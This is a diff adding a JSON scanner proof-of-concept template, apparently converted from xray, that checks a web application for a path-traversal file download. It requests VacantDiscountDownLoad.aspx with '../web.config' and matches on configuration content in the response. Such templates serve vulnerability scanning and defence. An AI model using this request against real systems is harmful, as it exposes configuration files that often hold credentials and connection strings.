@@ -1,0 +1,60 @@
+{
+  "name": "poc-yaml-test",
+  "author": "k3ppf0r",
+  "description": "",
+  "version": "",
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "linux()",
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "linux",
+      "method": "GET",
+      "path": "/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile\u003d../web.config",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": true,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 response.body_string.contains(\"configuration\")  \u0026\u0026 response.body_string.contains(\"system.web\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalFormat": "xray"
+}
